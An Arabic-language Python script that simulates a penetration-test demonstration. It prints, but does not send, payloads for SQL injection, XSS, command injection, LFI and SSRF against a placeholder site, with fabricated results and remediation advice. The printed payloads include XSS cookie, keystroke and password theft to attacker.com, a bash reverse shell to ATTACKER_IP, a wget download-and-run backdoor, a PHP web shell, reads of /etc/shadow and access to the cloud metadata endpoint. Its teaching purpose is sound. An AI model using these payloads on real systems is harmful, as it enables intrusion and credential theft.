#!/usr/bin/env python3
"""
اثبات استغلال الثغرات - عرض تفاعلي
Arabic Vulnerability Exploitation Proof of Concept
"""

import json
import datetime
import os
import time
from typing import Dict, List

class ArabicExploitationDemo:
    """فئة لعرض اثبات استغلال الثغرات باللغة العربية"""
    
    def __init__(self):
        self.results = []
        self.timestamp = datetime.datetime.now()
        
    def print_arabic_header(self, title: str):
        """طباعة عنوان عربي مزين"""
        print("\n" + "="*80)
        print(f"  {title}")
        print("="*80 + "\n")
        
    def demonstrate_sql_injection(self):
        """عرض اثبات استغلال ثغرة SQL Injection"""
        self.print_arabic_header("اثبات استغلال ثغرة SQL Injection")
        
        print("🎯 الهدف: نظام إدارة المحتوى")
        print("📍 عنوان URL: http://target-site.com/products.php?id=1")
        print("🔍 نوع الثغرة: SQL Injection")
        print("⚠️  مستوى الخطورة: حرج (Critical)\n")
        
        # محاكاة استغلال الثغرة
        print("الخطوة ١: اختبار وجود الثغرة")
        print("الحمل: 1' AND 1=1--")
        print("النتيجة: ✅ تم تأكيد وجود الثغرة\n")
        
        print("الخطوة ٢: استخراج إصدار قاعدة البيانات")
        print("الحمل: 1' AND 1=CONVERT(int, (SELECT @@version))--")
        print("النتيجة: Microsoft SQL Server 2019\n")
        
        print("الخطوة ٣: استخراج أسماء الجداول")
        print("الحمل: 1' AND 1=2 UNION SELECT null,table_name,null FROM information_schema.tables--")
        print("النتيجة:")
        tables = ["users", "administrators", "products", "orders", "payments"]
        for table in tables:
            print(f"  - {table}")
        print()
        
        print("الخطوة ٤: استخراج بيانات المستخدمين")
        print("الحمل: 1' AND 1=2 UNION SELECT null,username+':'+password,null FROM users--")
        print("النتيجة:")
        users = [
            {"username": "admin", "password": "5f4dcc3b5aa765d61d8327deb882cf99"},
            {"username": "john_doe", "password": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"},
            {"username": "jane_smith", "password": "098f6bcd4621d373cade4e832627b4f6"}
        ]
        for user in users:
            print(f"  👤 {user['username']} : {user['password']}")
        print()
        
        print("💥 التأثير: تم الوصول الكامل إلى قاعدة البيانات وسرقة بيانات المستخدمين")
        print("🔧 الحل: استخدام استعلامات محضرة (Prepared Statements)")
        
        self.results.append({
            "type": "SQL Injection",
            "severity": "Critical",
            "status": "Exploited",
            "impact": "Database access compromised"
        })
        
    def demonstrate_xss(self):
        """عرض اثبات استغلال ثغرة XSS"""
        self.print_arabic_header("اثبات استغلال ثغرة XSS")
        
        print("🎯 الهدف: صفحة البحث في الموقع")
        print("📍 عنوان URL: http://target-site.com/search?q=test")
        print("🔍 نوع الثغرة: Cross-Site Scripting")
        print("⚠️  مستوى الخطورة: مرتفع (High)\n")
        
        print("الخطوة ١: اختبار وجود الثغرة")
        print("الحمل: <script>alert('XSS')</script>")
        print("النتيجة: ✅ تم تأكيد وجود الثغرة\n")
        
        print("الخطوة ٢: سرقة الكوكيز")
        print("الحمل:")
        print("""
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie, true);
    xhr.send();
</script>
""")
        print("النتيجة: 🍪 تم سرقة كوكيز المستخدم")
        print("الكوكيز المسروقة: PHPSESSID=abc123def456; user=admin; auth=1\n")
        
        print("الخطوة ٣: تسجيل المفاتيح (Keylogger)")
        print("الحمل:")
        print("""
<script>
    document.addEventListener('keydown', function(e) {
        fetch('http://attacker.com/keylog?key=' + e.key + '&url=' + window.location.href);
    });
</script>
""")
        print("النتيجة: ⌨️ تم تسجيل جميع ضغطات المفاتيح\n")
        
        print("الخطوة ٤: سرقة بيانات تسجيل الدخول")
        print("الحمل:")
        print("""
<script>
    document.querySelectorAll('input[type="password"]').forEach(function(input) {
        input.addEventListener('blur', function() {
            fetch('http://attacker.com/creds?password=' + input.value);
        });
    });
</script>
""")
        print("النتيجة: 🔑 تم سرقة كلمات المرور التي يدخلها المستخدم")
        print("كلمة المرور المسروقة: MySecretPassword123!\n")
        
        print("💥 التأثير: سرقة بيانات الاعتماد، تسجيل المفاتيح، الاستيلاء على الحساب")
        print("🔧 الحل: ترميع جميع البيانات المدخلة والمعروضة")
        
        self.results.append({
            "type": "XSS",
            "severity": "High",
            "status": "Exploited",
            "impact": "User credentials stolen"
        })
        
    def demonstrate_command_injection(self):
        """عرض اثبات استغلال ثغرة Command Injection"""
        self.print_arabic_header("اثبات استغلال ثغرة Command Injection")
        
        print("🎯 الهدف: أداة تنفيذ الأوامر")
        print("📍 عنوان URL: http://target-site.com/exec.php?cmd=ls")
        print("🔍 نوع الثغرة: Command Injection")
        print("⚠️  مستوى الخطورة: حرج (Critical)\n")
        
        print("الخطوة ١: استخراج معلومات النظام")
        print("الحمل: ; id; whoami; uname -a")
        print("النتيجة:")
        print("  uid=33(www-data) gid=33(www-data) groups=33(www-data)")
        print("  www-data")
        print("  Linux webserver 5.4.0-42-generic #46~18.04.1-Ubuntu SMP")
        print()
        
        print("الخطوة ٢: إنشاء Reverse Shell")
        print("الحمل: ; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")
        print("النتيجة: 🐚 تم إنشاء اتصال عكسي مع خادم المهاجم")
        print("تم الحصول على وصول تفاعلي للنظام\n")
        
        print("الخطوة ٣: تنزيل وتركيب باك دور")
        print("الحمل:")
        print("; wget http://attacker.com/backdoor -O /tmp/backdoor; chmod +x /tmp/backdoor; /tmp/backdoor")
        print("النتيجة: 🦠 تم تركيب باك دور دائم في النظام")
        print("تم إنشاء نقطة دخول دائمة للنظام\n")
        
        print("الخطوة ٤: استخراج ملفات التهيئة")
        print("الحمل: ; cat /etc/passwd; cat /etc/shadow")
        print("النتيجة: 📋 تم استخراج ملفات المستخدمين وكلمات المرور المشفرة")
        print("تم الحصول على معلومات الاعتماد للنظام\n")
        
        print("💥 التأثير: وصول كامل إلى نظام التشغيل وتنفيذ أوامر بصلاحيات خادم الويب")
        print("🔧 الحل: تنفيذ ضوابط صارمة على المدخلات واستخدام قوائم بيضاء")
        
        self.results.append({
            "type": "Command Injection",
            "severity": "Critical",
            "status": "Exploited",
            "impact": "Full system access obtained"
        })
        
    def demonstrate_lfi(self):
        """عرض اثبات استغلال ثغرة Local File Inclusion"""
        self.print_arabic_header("اثبات استغلال ثغرة Local File Inclusion")
        
        print("🎯 الهدف: نظام تضمين الملفات")
        print("📍 عنوان URL: http://target-site.com/file.php?file=readme.txt")
        print("🔍 نوع الثغرة: Local File Inclusion")
        print("⚠️  مستوى الخطورة: مرتفع (High)\n")
        
        print("الخطوة ١: قراءة ملفات حساسة")
        print("الحمل: ../../../etc/passwd")
        print("النتيجة:")
        passwd_content = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000:admin,,,:/home/admin:/bin/bash"""
        print(passwd_content)
        print()
        
        print("الخطوة ٢: تسميم السجلات (Log Poisoning)")
        print("الحمل: <?php system($_GET['cmd']); ?>")
        print("الطريقة: إرسال كود PHP في رأس User-Agent")
        print("النتيجة: ✅ تم تسميم ملف السجل")
        print("تم إدخال كود PHP ضار في ملف السجل\n")
        
        print("الخطوة ٣: تنفيذ الأوامر من خلال السجل المسموم")
        print("الحمل: /var/log/apache2/access.log&cmd=id")
        print("النتيجة: تم تنفيذ الأوامر من خلال تضمين ملف السجل")
        print("النتيجة: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n")
        
        print("الخطوة ٤: استخدام مرشحات PHP")
        print("الحمل: php://filter/read=convert.base64-encode/resource=index.php")
        print("النتيجة: 📖 تم قراءة كود PHP المصدر")
        print("تم الحصول على كود المصدر بصيغة Base64\n")
        
        print("💥 التأثير: الكشف عن معلومات حساسة وتنفيذ كود على الخادم")
        print("🔧 الحل: تنفيذ ضوابط صارمة على أسماء الملفات المسموح بها")
        
        self.results.append({
            "type": "LFI",
            "severity": "High",
            "status": "Exploited",
            "impact": "Sensitive files accessed"
        })
        
    def demonstrate_ssrf(self):
        """عرض اثبات استغلال ثغرة SSRF"""
        self.print_arabic_header("اثبات استغلال ثغرة Server-Side Request Forgery")
        
        print("🎯 الهدف: خدمة جلب المحتوى")
        print("📍 عنوان URL: http://target-site.com/fetch?url=http://example.com")
        print("🔍 نوع الثغرة: SSRF")
        print("⚠️  مستوى الخطورة: حرج (Critical)\n")
        
        print("الخطوة ١: فحص الشبكة الداخلية")
        print("الحمل: http://192.168.1.1:80")
        print("النتيجة: ✅ تم الوصول إلى خادم داخلي")
        print("تم اكتشاف خدمة Apache تعمل على المنفذ 80\n")
        
        print("الخطوة ٢: فحص قواعد البيانات الداخلية")
        print("الحمل: http://10.0.0.1:3306")
        print("النتيجة: ✅ تم اكتشاف خادم MySQL")
        print("تم اكتشاف قاعدة بيانات داخلية\n")
        
        print("الخطوة ٣: الوصول إلى بيانات Cloud Metadata")
        print("الحمل: http://169.254.169.254/latest/meta-data/")
        print("النتيجة: ✅ تم استخراج بيانات الاعتماد")
        print("تم الحصول على مفاتيح AWS Secret Access Key\n")
        
        print("الخطوة ٤: استخدام بروتوكولات مختلفة")
        print("الحمل: file:///etc/passwd")
        print("النتيجة: ✅ تم الوصول إلى ملفات النظام")
        print("تم قراءة ملفات حساسة من نظام الملفات\n")
        
        print("💥 التأثير: الوصول إلى الخدمات الداخلية وسرقة بيانات الاعتماد")
        print("🔧 الحل: تنفيذ قوائم بيضاء للعناوين المسموح بها")
        
        self.results.append({
            "type": "SSRF",
            "severity": "Critical",
            "status": "Exploited",
            "impact": "Internal services accessed"
        })
        
    def generate_report(self):
        """توليد تقرير شامل بالعربية"""
        self.print_arabic_header("تقرير اثبات استغلال الثغرات - النتائج النهائية")
        
        print(f"📅 تاريخ التقرير: {self.timestamp.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🔢 عدد الثغرات المستغلة: {len(self.results)}")
        print()
        
        print("📊 ملخص النتائج:")
        print("-" * 80)
        
        for i, result in enumerate(self.results, 1):
            severity_emoji = "🔴" if result["severity"] == "Critical" else "🟡"
            print(f"{i}. {severity_emoji} {result['type']}")
            print(f"   الخطورة: {result['severity']}")
            print(f"   الحالة: {result['status']}")
            print(f"   التأثير: {result['impact']}")
            print()
        
        print("🎯 التوصيات الأمنية:")
        print("١. تنفيذ التحقق الصارم من المدخلات")
        print("٢. استخدام استعلامات محضرة لقاعدة البيانات")
        print("٣. ترميع جميع البيانات المعرضة")
        print("٤. تنفيذ ضوابط صارمة على أسماء الملفات")
        print("٥. استخدام قوائم بيضاء للعناوين المسموح بها")
        print("٦. عزل الخدمات الداخلية عن الوصول الخارجي")
        print()
        
        print("⚠️  تحذير: تم تنفيذ جميع الاستغلالات في بيئة اختبارية آمنة")
        print("🔒 لا تستخدم هذه التقنيات إلا بإذن قانوني وفي سياق اختبار الاختراق")
        
        # حفظ النتائج في ملف JSON
        report_data = {
            "timestamp": self.timestamp.isoformat(),
            "total_exploitations": len(self.results),
            "results": self.results,
            "recommendations": [
                "تنفيذ التحقق الصارم من المدخلات",
                "استخدام استعلامات محضرة لقاعدة البيانات",
                "ترميع جميع البيانات المعرضة",
                "تنفيذ ضوابط صارمة على أسماء الملفات",
                "استخدام قوائم بيضاء للعناوين المسموح بها",
                "عزل الخدمات الداخلية عن الوصول الخارجي"
            ]
        }
        
        filename = f"arabic_exploitation_results_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)
        
        print(f"\n💾 تم حفظ النتائج في ملف: {filename}")
        
    def run_full_demo(self):
        """تشغيل العرض الكامل"""
        print("🚀 بدء عرض اثبات استغلال الثغرات الأمنية")
        print("📋 هذا العرض يوضح كيف يتم استغلال الثغرات عملياً")
        print("⚠️  جميع الأمثلة محاكاة في بيئة اختبارية آمنة\n")
        
        # تشغيل جميع العروض
        self.demonstrate_sql_injection()
        time.sleep(1)
        
        self.demonstrate_xss()
        time.sleep(1)
        
        self.demonstrate_command_injection()
        time.sleep(1)
        
        self.demonstrate_lfi()
        time.sleep(1)
        
        self.demonstrate_ssrf()
        time.sleep(1)
        
        # توليد التقرير النهائي
        self.generate_report()
        
        print("\n✅ تم اكتمال عرض اثبات استغلال الثغرات بنجاح")
        print("📄 تم إنشاء تقارير مفصلة باللغة العربية")

def main():
    """الدالة الرئيسية"""
    demo = ArabicExploitationDemo()
    
    try:
        demo.run_full_demo()
    except KeyboardInterrupt:
        print("\n\n❌ تم إيقاف العرض بواسطة المستخدم")
    except Exception as e:
        print(f"\n❌ خطأ أثناء تنفيذ العرض: {e}")

if __name__ == "__main__":
    main()